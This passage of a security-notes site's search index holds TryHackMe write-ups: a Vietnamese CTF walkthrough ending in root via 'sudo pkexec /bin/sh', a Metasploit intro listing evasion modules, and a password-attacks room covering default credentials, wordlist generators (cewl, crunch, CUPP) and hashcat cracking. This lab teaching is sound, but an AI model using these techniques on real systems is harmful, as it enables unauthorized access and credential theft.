n\u1ed9i dung tr\u00f4ng nh\u01b0 th\u1ebf n\u00e0y \u0111\u00e2y: Alt text \u0110\u1ec3 \u00fd ch\u00fat x\u00edu th\u00ec trang n\u00e0y ch\u1ee9a th\u00f4ng tin b\u1ed5 \u00edch cho ch\u00fang ta \u0111\u00ea\u00ed. H\u1ecd b\u1ea3o h\u00e3y d\u00f9ng word g\u00ec \u0111\u00f3 \u0111\u1ec3 \u0111\u1ebfn \u0111\u01b0\u1ee3c LianYu th\u00ec ch\u1eafc l\u00e0 username cho ftp hay ssh g\u00ec \u0111\u00f3 ro\u00e0i. Ta xem source code th\u00ec nh\u1eadn \u0111\u01b0\u1ee3c m\u00e3 vigilante \u0111\u01b0\u1ee3c \u0111\u00e1nh color white t\u1eeb \u0111\u1ea7u. B\u1ea3o sao ::). Ti\u1ebfp t\u1ee5c gobuster \u0111\u1ec3 qu\u00e9t url... Alt text Xem source code c\u1ee7a website m\u1edbi ta th\u1ea5y c\u00f3 1 d\u00f2ng command v\u1ec1 file c\u00f3 extension l\u00e0 .ticket. Ti\u1ebfp t\u1ee5c d\u00f9ng gobuster v\u00e0 ta t\u00ecm \u0111\u01b0\u1ee3c file green_arrow.ticket . Alt text N\u1ed9i dung file m\u00f4 t\u1ea3 l\u00e0 token c\u1ee7a Queen's Gambit(Ship) Alt text \u0110\u00e2y l\u00e0 1 password \u0111\u01b0\u1ee3c m\u00e3 h\u00f3a theo base58. Sau khi gi\u1ea3i m\u00e3, ta \u0111\u01b0\u1ee3c flag: !#th3h00d. B\u00e2y gi\u1edd \u0111\u00e3 \u0111\u1ee7: username = vigilante password = !#th3h00d Ta th\u1eed th\u00ec \u0111\u00e2y ch\u00ednh l\u00e0 th\u00f4ng tin \u0111\u1ec3 login ftp. Ro\u00e0i, login th\u00f4i Alt text V\u00e0 xem, ta c\u00f3 g\u00ec n\u00e0o, 3 file \u1ea3nh. Ta s\u1ebd get n\u00f3 v\u1ec1 m\u00e1y v\u00e0 xem th\u00ec ph\u00e1t hi\u1ec7n file \u1ea3nh Leave_me_alone.png m\u1eb7c d\u00f9 \u0111\u00fang extension nh\u01b0ng m\u00e3 hex b\u1ecb sai l\u00e0m cho vi\u1ec7c xem \u1ea3nh tr\u1edf n\u00ean kh\u00f4ng th\u1ec3. Ta s\u1ebd ch\u1ec9nh l\u1ea1i hex b\u1eb1ng th\u00f4ng tin tr\u00ean wiki Alt text V\u00e0 ta \u0111\u00e3 th\u1ea5y th\u00f4ng tin tr\u00ean \u1ea3nh Alt text Ch\u1ea3 c\u00f3 g\u00ec \u1edf tr\u1ecfng :). Osint ti\u1ebfp c\u00e1c file \u1ea3nh kh\u00e1c th\u00f4i Nh\u1eadn th\u1ea5y file aa.jpg nh\u01b0 file r\u00e1c g\u00ec \u0111\u00f3, ch\u1eafc h\u1eb5n l\u00e0 fiel ch\u1ee9a d\u1eef li\u1ec7u \u1ea9n gi\u1ea5u, ta d\u00f9ng c\u00e1c c\u00f4ng c\u1ee5 \u0111\u1ec3 xem file \u1ea9n. \u1ede \u0111\u00e2y t\u00f4i d\u00f9ng stegseek -sf aa.jpg v\u00e0 t\u00ecm \u0111\u01b0\u1ee3c file shado ch\u1ee9a password, \u0111\u00e2y l\u00e0 flag c\u1ea7n t\u00ecm. Login ssh v\u1edbi user slade, ta s\u1ebd xem \u0111\u01b0\u1ee3c file user.txt. Ti\u1ebfp theo, ki\u1ec3m tra quy\u1ec1n c\u1ee7a slade b\u1eb1ng sudo -l v\u00e0 \u0111\u00e2y b\u1ecb l\u1ed7i leo thang \u0111\u1eb7c quy\u1ec1n pkexec \u0111\u01b0\u1ee3c ph\u00e9p s\u1eed d\u1ee5ng sudo. Ta s\u1ebd ti\u1ebfn h\u00e0nh leo thang \u0111\u1eb7c quy\u1ec1n b\u1eb1ng sudo pkexec /bin/sh v\u00e0 l\u1ea5y \u0111\u01b0\u1ee3c quy\u1ec1n root.","title":"Explanation and attack scenario"},{"location":"tryhackme/room/metasploit/","tags":["THM-Room"],"text":"TryHackMe - Metasploit \u00b6 Metasploit is the most widely used exploitation framework. Learn how to use it and unlock its full potential. The Metasploit framework is a set of open-source tools used for network enumeration, identifying vulnerabilities, developing payloads and executing exploit code against remote target machines. Get hands-on with the various tool and features Metasploit provides, from exploit development to post-exploitation techniques, this module covers it all. Task 1: Introduction to Metasploit \u00b6 Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation. Metasploit has two main versions: Metasploit Pro : The commercial version that facilitates the automation and management of tasks. This version has a graphical user interface (GUI). Metasploit Framework : The open-source version that works from the command line. This room will focus on this version, installed on the AttackBox and most commonly used penetration testing Linux distributions. The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development. The main components of the Metasploit Framework can be summarized as follows; msfconsole : The main command-line interface. Modules : supporting modules such as exploits, scanners, payloads, etc. Tools : Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module. This room will cover the main components of Metasploit while providing you with a solid foundation on how to find relevant exploits, set parameters, and exploit vulnerable services on the target system. Once you have completed this room, you will be able to navigate and use the Metasploit command line comfortably. You can deploy and use the AttackBox to complete tasks and answer the questions. Answer the questions below No answer needed Answer Explain No answer needed No answer needed Task 2: Main Components of Metasploit \u00b6 While using the Metasploit Framework, you will primarily interact with the Metasploit console. You can launch it from the AttackBox terminal using the msfconsole command. The console will be your main interface to interact with the different modules of the Metasploit Framework. Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack. Before diving into modules, it would be helpful to clarify a few recurring concepts: vulnerability, exploit, and payload. Exploit : A piece of code that uses a vulnerability present on the target system. Vulnerability : A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system. Payload : An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system. Modules and categories under each one are listed below. These are given for reference purposes, but you will interact with them through the Metasploit console (msfconsole). Auxiliary \u00b6 Any supporting module, such as scanners, crawlers and fuzzers, can be found here. Terminal root @ip - 10 - 10 - 135 - 188 :/ opt / metasploit-framework / embedded / framework / modules # tree -L 1 auxiliary/ auxiliary / \u251c\u2500\u2500 admin \u251c\u2500\u2500 analyze \u251c\u2500\u2500 bnat \u251c\u2500\u2500 client \u251c\u2500\u2500 cloud \u251c\u2500\u2500 crawler \u251c\u2500\u2500 docx \u251c\u2500\u2500 dos \u251c\u2500\u2500 example . py \u251c\u2500\u2500 example . rb \u251c\u2500\u2500 fileformat \u251c\u2500\u2500 fuzzers \u251c\u2500\u2500 gather \u251c\u2500\u2500 parser \u251c\u2500\u2500 pdf \u251c\u2500\u2500 scanner \u251c\u2500\u2500 server \u251c\u2500\u2500 sniffer \u251c\u2500\u2500 spoof \u251c\u2500\u2500 sqli \u251c\u2500\u2500 voip \u2514\u2500\u2500 vsploit 20 directories , 2 files Encoders \u00b6 Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them. Signature-based antivirus and security solutions have a database of known threats. They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks. Terminal root @ip - 10 - 10 - 135 - 188 :/ opt / metasploit-framework / embedded / framework / modules # tree -L 1 encoders/ encoders / \u251c\u2500\u2500 cmd \u251c\u2500\u2500 generic \u251c\u2500\u2500 mipsbe \u251c\u2500\u2500 mipsle \u251c\u2500\u2500 php \u251c\u2500\u2500 ppc \u251c\u2500\u2500 ruby \u251c\u2500\u2500 sparc \u251c\u2500\u2500 x64 \u2514\u2500\u2500 x86 10 directories , 0 files Evasion \u00b6 While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, \u201cevasion\u201d modules will try that, with more or less success. Terminal root @ip - 10 - 10 - 135 - 188 :/ opt / metasploit-framework / embedded / framework / modules # tree -L 2 evasion/ evasion / \u2514\u2500\u2500 windows \u251c\u2500\u2500 applocker_evasion_install_util . rb \u251c\u2500\u2500 applocker_evasion_msbuild . rb \u251c\u2500\u2500 applocker_evasion_presentationhost . rb \u251c\u2500\u2500 applocker_evasion_regasm_regsvcs . rb \u251c\u2500\u2500 applocker_evasion_workflow_compiler . rb \u251c\u2500\u2500 process_herpaderping . rb \u251c\u2500\u2500 syscall_inject . rb \u251c\u2500\u2500 windows_defender_exe . rb \u2514\u2500\u2500 windows_defender_js_hta . rb 1 directory , 9 files","title":"TryHackMe - Metasploit"},{"location":"tryhackme/room/metasploit/#tryhackme-metasploit","text":"Metasploit is the most widely used exploitation framework. Learn how to use it and unlock its full potential. The Metasploit framework is a set of open-source tools used for network enumeration, identifying vulnerabilities, developing payloads and executing exploit code against remote target machines. Get hands-on with the various tool and features Metasploit provides, from exploit development to post-exploitation techniques, this module covers it all.","title":"TryHackMe - Metasploit"},{"location":"tryhackme/room/metasploit/#task-1-introduction-to-metasploit","text":"Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation. Metasploit has two main versions: Metasploit Pro : The commercial version that facilitates the automation and management of tasks. This version has a graphical user interface (GUI). Metasploit Framework : The open-source version that works from the command line. This room will focus on this version, installed on the AttackBox and most commonly used penetration testing Linux distributions. The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development. The main components of the Metasploit Framework can be summarized as follows; msfconsole : The main command-line interface. Modules : supporting modules such as exploits, scanners, payloads, etc. Tools : Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module. This room will cover the main components of Metasploit while providing you with a solid foundation on how to find relevant exploits, set parameters, and exploit vulnerable services on the target system. Once you have completed this room, you will be able to navigate and use the Metasploit command line comfortably. You can deploy and use the AttackBox to complete tasks and answer the questions. Answer the questions below No answer needed Answer Explain No answer needed No answer needed","title":"Task 1: Introduction to Metasploit"},{"location":"tryhackme/room/metasploit/#task-2-main-components-of-metasploit","text":"While using the Metasploit Framework, you will primarily interact with the Metasploit console. You can launch it from the AttackBox terminal using the msfconsole command. The console will be your main interface to interact with the different modules of the Metasploit Framework. Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack. Before diving into modules, it would be helpful to clarify a few recurring concepts: vulnerability, exploit, and payload. Exploit : A piece of code that uses a vulnerability present on the target system. Vulnerability : A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system. Payload : An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system. Modules and categories under each one are listed below. These are given for reference purposes, but you will interact with them through the Metasploit console (msfconsole).","title":"Task 2: Main Components of Metasploit"},{"location":"tryhackme/room/metasploit/#auxiliary","text":"Any supporting module, such as scanners, crawlers and fuzzers, can be found here. Terminal root @ip - 10 - 10 - 135 - 188 :/ opt / metasploit-framework / embedded / framework / modules # tree -L 1 auxiliary/ auxiliary / \u251c\u2500\u2500 admin \u251c\u2500\u2500 analyze \u251c\u2500\u2500 bnat \u251c\u2500\u2500 client \u251c\u2500\u2500 cloud \u251c\u2500\u2500 crawler \u251c\u2500\u2500 docx \u251c\u2500\u2500 dos \u251c\u2500\u2500 example . py \u251c\u2500\u2500 example . rb \u251c\u2500\u2500 fileformat \u251c\u2500\u2500 fuzzers \u251c\u2500\u2500 gather \u251c\u2500\u2500 parser \u251c\u2500\u2500 pdf \u251c\u2500\u2500 scanner \u251c\u2500\u2500 server \u251c\u2500\u2500 sniffer \u251c\u2500\u2500 spoof \u251c\u2500\u2500 sqli \u251c\u2500\u2500 voip \u2514\u2500\u2500 vsploit 20 directories , 2 files","title":"Auxiliary"},{"location":"tryhackme/room/metasploit/#encoders","text":"Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them. Signature-based antivirus and security solutions have a database of known threats. They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks. Terminal root @ip - 10 - 10 - 135 - 188 :/ opt / metasploit-framework / embedded / framework / modules # tree -L 1 encoders/ encoders / \u251c\u2500\u2500 cmd \u251c\u2500\u2500 generic \u251c\u2500\u2500 mipsbe \u251c\u2500\u2500 mipsle \u251c\u2500\u2500 php \u251c\u2500\u2500 ppc \u251c\u2500\u2500 ruby \u251c\u2500\u2500 sparc \u251c\u2500\u2500 x64 \u2514\u2500\u2500 x86 10 directories , 0 files","title":"Encoders"},{"location":"tryhackme/room/metasploit/#evasion","text":"While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, \u201cevasion\u201d modules will try that, with more or less success. Terminal root @ip - 10 - 10 - 135 - 188 :/ opt / metasploit-framework / embedded / framework / modules # tree -L 2 evasion/ evasion / \u2514\u2500\u2500 windows \u251c\u2500\u2500 applocker_evasion_install_util . rb \u251c\u2500\u2500 applocker_evasion_msbuild . rb \u251c\u2500\u2500 applocker_evasion_presentationhost . rb \u251c\u2500\u2500 applocker_evasion_regasm_regsvcs . rb \u251c\u2500\u2500 applocker_evasion_workflow_compiler . rb \u251c\u2500\u2500 process_herpaderping . rb \u251c\u2500\u2500 syscall_inject . rb \u251c\u2500\u2500 windows_defender_exe . rb \u2514\u2500\u2500 windows_defender_js_hta . rb 1 directory , 9 files","title":"Evasion"},{"location":"tryhackme/room/nax/","tags":["THM-Room","Privilege Escalation"],"text":"Relevant \u00b6 Task 1: Flag \u00b6 Alt text Are you able to complete the challenge? The machine may take up to 5 minutes to boot and configure Note : This room requires Metasploit 6.","title":"Relevant"},{"location":"tryhackme/room/nax/#relevant","text":"","title":"Relevant"},{"location":"tryhackme/room/nax/#task-1-flag","text":"Alt text Are you able to complete the challenge? The machine may take up to 5 minutes to boot and configure Note : This room requires Metasploit 6.","title":"Task 1: Flag"},{"location":"tryhackme/room/password-attacks/","tags":["THM-Room"],"text":"Password Attacks \u00b6 Task 1: Introduction \u00b6 This room is an introduction to the types and techniques used in password attacks. We will discuss the ways to get and generate custom password lists. The following are some of the topics we will discuss: Password profiling Password attacks techniques Online password attacks What is a password? \u00b6 Passwords are used as an authentication method for individuals to access computer systems or applications. Using passwords ensures the owner of the account is the only one who has access. However, if the password is shared or falls into the wrong hands, unauthorized changes to a given system could occur. Unauthorized access could potentially lead to changes in the system's overall status and health or damage the file system. Passwords are typically comprised of a combination of characters such as letters, numbers, and symbols. Thus, it is up to the user how they generate passwords! A collection of passwords is often referred to as a dictionary or wordlist. Passwords with low complexity that are easy to guess are commonly found in various publicly disclosed password data breaches. For example, an easy-to-guess password could be password , 123456 , 111111 , and much more. Here are the top 100 and most common and seen passwords for your reference. Thus, it won't take long and be too difficult for the attacker to run password attacks against the target or service to guess the password. Choosing a strong password is a good practice, making it hard to guess or crack. Strong passwords should not be common words or found in dictionaries as well as the password should be an eight characters length at least. It also should contain uppercase and lower case letters, numbers, and symbol strings (ex: *&^%$#@ ). Sometimes, companies have their own password policies and enforce users to follow guidelines when creating passwords. This helps ensure users aren't using common or weak passwords within their organization and could limit attack vectors such as brute-forcing. For example, a password length has to be eight characters and more, including characters, a couple of numbers, and at least one symbol. However, if the attacker figures out the password policy, he could generate a password list that satisfies the account password policy. How secure are passwords? \u00b6 Passwords are a protection method for accessing online accounts or computer systems. Passwords authentication methods are used to access personal and private systems, and its main goal of using the password is to keep it safe and not share it with others. To answer the question: How secure are passwords? depends on various factors. Passwords are usually stored within the file system or database, and keeping them safe is essential. We've seen cases where companies store passwords into plaintext documents, such as the Sony breach in 2014. Therefore, once an attacker accesses the file system, he can easily obtain and reuse these passwords. On the other hand, others store passwords within the system using various techniques such as hashing functions or encryption algorithms to make them more secure. Even if the attacker has to access the system, it will be harder to crack. We will cover cracking hashes in the upcoming tasks. Answer the questions below Learn about password attacking techniques in the next task! Answer No needed answer Task 2: Password Attacking Techniques \u00b6 Alt text Password Attack Techniques \u00b6 In this room, we will discuss the techniques that could be used to perform password attacks. We will cover various techniques such as a dictionary, brute-force, rule-base, and guessing attacks. All the above techniques are considered active 'online' attacks where the attacker needs to communicate with the target machine to obtain the password in order to gain unauthorized access to the machine. Password Cracking vs. Password Guessing \u00b6 This section discusses password cracking terminology from a cybersecurity perspective. Also, we will discuss significant differences between password cracking and password guessing. Finally, we'll demonstrate various tools used for password cracking, including Hashcat and John the Ripper . Password cracking is a technique used for discovering passwords from encrypted or hashed data to plaintext data. Attackers may obtain the encrypted or hashed passwords from a compromised computer or capture them from transmitting data over the network. Once passwords are obtained, the attacker can utilize password attacking techniques to crack these hashed passwords using various tools. Password cracking is considered one of the traditional techniques in pen-testing. The primary goal is to let the attacker escalate to higher privileges and access to a computer system or network. Password guessing and password cracking are often commonly used by information security professionals. Both have different meanings and implications. Password guessing is a method of guessing passwords for online protocols and services based on dictionaries. The following are major differences between password cracking and password guessing: Password guessing is a technique used to target online protocols and services. Therefore, it's considered time-consuming and opens up the opportunity to generate logs for the failed login attempts. A password guessing attack conducted on a web-based system often requires a new request to be sent for each attempt, which can be easily detected. It may cause an account to be locked out if the system is designed and configured securely. Password cracking is a technique performed locally or on systems controlled by the attacker. Answer the questions below Which type of password attack is performed locally? Answer Explain Password cracking Password cracking is a technique performed locally or on systems controlled by the attacker. Task 3: Password Profiling #1 - Default, Weak, Leaked, Combined , and Username Wordlists \u00b6 Having a good wordlist is critical to carrying out a successful password attack. It is important to know how you can generate username lists and password lists. In this section, we will discuss creating targeted username and password lists. We will also cover various topics, including default, weak, leaked passwords, and creating targeted wordlists. Default Passwords \u00b6 Before performing password attacks, it is worth trying a couple of default passwords against the targeted service. Manufacturers set default passwords with products and equipment such as switches, firewalls, routers. There are scenarios where customers don't change the default password, which makes the system vulnerable. Thus, it is a good practice to try out admin:admin , admin:123456 , etc. If we know the target device, we can look up the default passwords and try them out. For example, suppose the target server is a Tomcat, a lightweight, open-source Java application server. In that case, there are a couple of possible default passwords we can try: admin:admin or tomcat:admin . Here are some website lists that provide default passwords for various products. https://cirt.net/passwords https://default-password.info/ https://datarecovery.com/rd/default-passwords/ Weak Passwords \u00b6 Professionals collect and generate weak password lists over time and often combine them into one large wordlist. Lists are generated based on their experience and what they see in pentesting engagements. These lists may also contain leaked passwords that have been published publically. Here are some of the common weak passwords lists : https://wiki.skullsecurity.org/index.php?title=Passwords - This includes the most well-known collections of passwords. SecLists - A huge collection of all kinds of lists, not only for password cracking. Leaked Passwords \u00b6 Sensitive data such as passwords or hashes may be publicly disclosed or sold as a result of a breach. These public or privately available leaks are often referred to as 'dumps'. Depending on the contents of the dump, an attacker may need to extract the passwords out of the data. In some cases, the dump may only contain hashes of the passwords and require cracking in order to gain the plain-text passwords. The following are some of the common password lists that have weak and leaked passwords, including webhost , elitehacker , hak5 , Hotmail , PhpBB companies' leaks: SecLists/Passwords/Leaked-Databases Combined wordlists \u00b6 Let's say that we have more than one wordlist. Then, we can combine these wordlists into one large file. This can be done as follows using cat : cewl cat file1 . txt file2 . txt file3 . txt > combined_list . txt To clean up the generated combined list to remove duplicated words, we can use sort and uniq as follows: cewl sort combined_list . txt | uniq -u > cleaned_combined_list . txt Customized Wordlists \u00b6 Customizing password lists is one of the best ways to increase the chances of finding valid credentials. We can create custom password lists from the target website. Often, a company's website contains valuable information about the company and its employees, including emails and employee names. In addition, the website may contain keywords specific to what the company offers, including product and service names, which may be used in an employee's password! Tools such as Cewl can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. Consider the following example below cewl user @thm $ cewl -w list . txt -d 5 -m 5 http :// thm . labs -w will write the contents to a file. In this case, list.txt. -m 5 gathers strings (words) that are 5 characters or more -d 5 is the depth level of web crawling/spidering (default 2) http://thm.labs is the URL that will be used As a result, we should now have a decently sized wordlist based on relevant words for the specific enterprise, like names, locations, and a lot of their business lingo. Similarly, the wordlist that was created could be used to fuzz for usernames. Apply what we discuss using cewl against https://clinic.thmredteam.com/ to parse all words and generate a wordlist with a minimum length of 8. Note that we will be using this wordlist later on with another task! Username Wordlists \u00b6 Gathering employees' names in the enumeration stage is essential. We can generate username lists from the target's website. For the following example, we'll assume we have a {first name} {last name} (ex: John Smith) and a method of generating usernames. {first name} : john {last name} : smith {first name}{last name} : johnsmith {last name}{first name} : smithjohn first letter of the {first name}{last name} : jsmith first letter of the {last name}{first name} : sjohn first letter of the {first name}.{last name} : j.smith first letter of the {first name}-{last name} : j-smith and so on Thankfully, there is a tool username_generator that could help create a list with most of the possible combinations if we have a first name and last name. Usernames user @thm $ git clone https :// github . com / therodri2 / username_generator . git Cloning into 'username_generator' ... remote : Enumerating objects : 9 , done . remote : Counting objects : 100 % ( 9 / 9 ), done . remote : Compressing objects : 100 % ( 7 / 7 ), done . remote : Total 9 ( delta 0 ), reused 0 ( delta 0 ), pack-reused 0 Receiving objects : 100 % ( 9 / 9 ), done . user @thm $ cd username_generator Using python3 username_generator.py -h shows the tool's help message and optional arguments. Usernames user @thm $ python3 username_generator . py -h usage : username_generator . py [ -h ] -w wordlist [ -u ] Python script to generate user lists for bruteforcing ! optional arguments : -h , - -help show this help message and exit -w wordlist , - -wordlist wordlist Specify path to the wordlist -u , - -uppercase Also produce uppercase permutations . Disabled by default ``` Now let 's create a wordlist that contains the full name John Smith to a text file. Then, we' ll run the tool to generate the possible combinations of the given full name . ``` ps1 title = \"Usernames\" user @thm $ echo \"John Smith\" > users . lst user @thm $ python3 username_generator . py -w users . lst usage : username_generator . py [ -h ] -w wordlist [ -u ] john smith j . smith j-smith j_smith j + smith jsmith smithjohn This is just one example of a custom username generator. Please feel free to explore more options or even create your own in the programming language of your choice! Answer the questions below What are the default login credentials (in the format of username:password ) for a Juniper Networks ISG 2000 device? Answer netscreen : netscreen Task 4: Password Profiling #2 - Keyspace Technique and CUPP \u00b6 Keyspace Technique \u00b6 Another way of preparing a wordlist is by using the key-space technique. In this technique, we specify a range of characters, numbers, and symbols in our wordlist. crunch is one of many powerful tools for creating an offline wordlist. With crunch , we can specify numerous options, including min, max, and options as follows: crunch user @thm $ crunch -h crunch version 3 . 6 Crunch can create a wordlist based on the criteria you specify . The output from crunch can be sent to the screen , file , or to another program . Usage : crunch [options] where min and max are numbers Please refer to the man page for instructions and examples on how to use crunch . The following example creates a wordlist containing all possible combinations of 2 characters, including 0-4 and a-d. We can use the -o argument and specify a file to save the output to. crunch user @thm $ crunch 2 2 01234abcd -o crunch . txt Crunch will now generate the following amount of data : 243 bytes 0 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines : xx crunch : 100 % completed generating output Here is a snippet of the output: crunch user @thm $ cat crunch . txt 00 01 02 03 04 0a 0b 0c 0d 10 . . . cb cc cd d0 d1 d2 d3 d4 da db dc dd It's worth noting that crunch can generate a very large text file depending on the word length and combination options you specify. The following command creates a list with an 8 character minimum and maximum length containing numbers 0-9, a-f lowercase letters, and A-F uppercase letters: crunch 8 8 0123456789abcdefABCDEF -o crunch.txt the file generated is 459 GB and contains 54875873536 words. crunch also lets us specify a character set using the -t option to combine words of our choice. Here are some of the other options that could be used to help create different combinations of your choice: @ - lower case alpha characters , - upper case alpha characters % - numeric characters ^ - special characters including space For example, if part of the password is known to us, and we know it starts with pass and follows two numbers, we can use the % symbol from above to match the numbers. Here we generate a wordlist that contains pass followed by 2 numbers: crunch user @thm $ crunch 6 6 -t pass %% Crunch will now generate the following amount of data : 700 bytes 0 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines : 100 pass00 pass01 pass02 pass03 CUPP - Common User Passwords Profiler \u00b6 CUPP is an automatic and interactive tool written in Python for creating custom wordlists. For instance, if you know some details about a specific target, such as their birthdate, pet name, company name, etc., this could be a helpful tool to generate passwords based on this known information. CUPP will take the information supplied and generate a custom wordlist based on what's provided. There's also support for a 1337/leet mode , which substitutes the letters a, i,e, t, o, s, g, z with numbers. For example, replace a with 4 or i with 1. For more information about the tool, please visit the GitHub repo here . To run CUPP, we need python 3 installed. Then clone the GitHub repo to your local machine using git as follows: CUPP user @thm $ git clone https :// github . com / Mebus / cupp . git Cloning into 'cupp' ... remote : Enumerating objects : 237 , done . remote : Total 237 ( delta 0 ), reused 0 ( delta 0 ), pack-reused 237 Receiving objects : 100 % ( 237 / 237 ), 2 . 14 MiB | 1 . 32 MiB / s , done . Resolving deltas : 100 % ( 125 / 125 ), done . Now change the current directory to CUPP and run python3 cupp.py or with -h to see the available options. CUPP user @thm $ python3 cupp . py ___________ cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] usage : cupp . py [ -h ] [ -i | -w FILENAME | -l | -a | -v ] [ -q ] Common User Passwords Profiler optional arguments : -h , - -help show this help message and exit -i , - -interactive Interactive questions for user password profiling -w FILENAME Use this option to improve existing dictionary , or WyD . pl output to make some pwnsauce -l Download huge wordlists from repository -a Parse default usernames and passwords directly from Alecto DB . Project Alecto uses purified databases of Phenoelit and CIRT which were merged and enhanced -v , - -version Show the version of this program . -q , - -quiet Quiet mode ( don ' t print banner ) CUPP supports an interactive mode where it asks questions about the target and based on the provided answers, it creates a custom wordlist. If you don't have an answer for the given field, then skip it by pressing the Enter key. CUPP user @thm $ python3 cupp . py -i ___________ cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] [+] Insert the information about the victim to make a dictionary [+] If you don 't know all the info, just hit enter when asked! ;) > First Name: > Surname: > Nickname: > Birthdate (DDMMYYYY): > Partners) name: > Partners) nickname: > Partners) birthdate (DDMMYYYY): > Child' s name : > Child 's nickname: > Child' s birthdate ( DDMMYYYY ): > Pet ' s name : > Company name : > Do you want to add some key words about the victim ? Y / [N] : > Do you want to add special chars at the end of words ? Y / [N] : > Do you want to add some random numbers at the end of words ? Y / [N] : > Leet mode ? ( i . e . leet = 1337 ) Y / [N] : [+] Now making a dictionary ... [+] Sorting list and removing duplicates ... [+] Saving dictionary to ..... txt , counting ..... words . > Hyperspeed Print ? ( Y / n ) \u0650As a result, a custom wordlist that contains various numbers of words based on your entries is generated. Pre-created wordlists can be downloaded to your machine as follows: CUPP user @thm $ python3 cupp . py -l ___________ cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] Choose the section you want to download : 1 Moby 14 french 27 places 2 afrikaans 15 german 28 polish 3 american 16 hindi 29 random 4 aussie 17 hungarian 30 religion 5 chinese 18 italian 31 russian 6 computer 19 japanese 32 science 7 croatian 20 latin 33 spanish 8 czech 21 literature 34 swahili 9 danish 22 movieTV 35 swedish 10 databases 23 music 36 turkish 11 dictionaries 24 names 37 yiddish 12 dutch 25 net 38 exit program 13 finnish 26 norwegian Files will be downloaded from http :// ftp . funet . fi / pub / unix / security / passwd / crack / dictionaries / repository Tip : After downloading wordlist , you can improve it with -w option > Enter number : Based on your interest, you can choose the wordlist from the list above to aid in generating wordlists for brute-forcing! Finally, CUPP could also provide default usernames and passwords from the Alecto database by using the -a option. CUPP user @thm $ python3 cupp . py -a ___________ cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] [+] Checking if alectodb is not present ... [+] Downloading alectodb . csv . gz from https :// github . com / yangbh / Hammer / raw / b0446396e8d67a7d4e53d6666026e078262e5bab / lib / cupp / alectodb . csv . gz ... [+] Exporting to alectodb-usernames . txt and alectodb-passwords . txt [+] Done . Answer the questions below Run the following crunch command:crunch 2 2 01234abcd -o crunch.txt. How many words did crunch generate? Answer 81 Task 5: Offline Attacks - Dictionary and Brute-Force \u00b6 This section discusses offline attacks, including dictionary, brute-force, and rule-based attacks. Dictionary attack \u00b6 A dictionary attack is a technique used to guess passwords by using well-known words or phrases. The dictionary attack relies entirely on pre-gathered wordlists that were previously generated or found. It is important to choose or create the best candidate wordlist for your target in order to succeed in this attack. Let's explore performing a dictionary attack using what you've learned in the previous tasks about generating wordlists. We will showcase an offline dictionary attack using hashcat , which is a popular tool to crack hashes. Let's say that we obtain the following hash f806fc5a2a0d5ba2471600758452799c , and want to perform a dictionary attack to crack it. First, we need to know the following at a minimum: 1- What type of hash is this? 2- What wordlist will we be using? Or what type of attack mode could we use? To identify the type of hash, we could a tool such as hashid or hash-identifier . For this example, hash-identifier believed the possible hashing method is MD5. Please note the time to crack a hash will depend on the hardware you're using (CPU and/or GPU). Dictionary attack user @machine $ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c / usr / share / wordlists / rockyou . txt hashcat ( v6 . 1 . 1 ) starting ... f806fc5a2a0d5ba2471600758452799c : rockyou Session ..........: hashcat Status ...........: Cracked Hash . Name ........: MD5 Hash . Target ......: f806fc5a2a0d5ba2471600758452799c Time . Started .....: Mon Oct 11 08 